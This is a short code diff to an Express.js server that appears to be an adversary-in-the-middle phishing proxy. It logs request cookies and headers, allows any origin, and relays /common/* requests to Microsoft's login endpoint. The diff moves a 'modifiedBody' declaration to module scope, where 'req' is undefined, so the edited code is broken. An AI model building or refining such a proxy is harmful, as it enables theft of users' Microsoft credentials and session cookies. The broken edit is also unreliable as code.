@@ -15,6 +15,8 @@ app.get("/", (req, res) => {
   console.log("cookies:", req.headers.cookie);
 });
 
+const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
+
 //allows cors
 app.use((req, res, next) => {
   res.header("Access-Control-Allow-Origin", "*");
@@ -32,7 +34,7 @@ app.use((req, res, next) => {
     method: req.method,
     path: req.path,
     headers: req.headers,
-    body: req.body,
+    body: modifiedBody,
   });
   next();
 });
@@ -43,7 +45,7 @@ app.use("/common/*", async (req, res) => {
     const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
     console.log("Target URL:", targetUrl);
 
-    const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
+    
     
     const response = await axios({
       method: req.method,
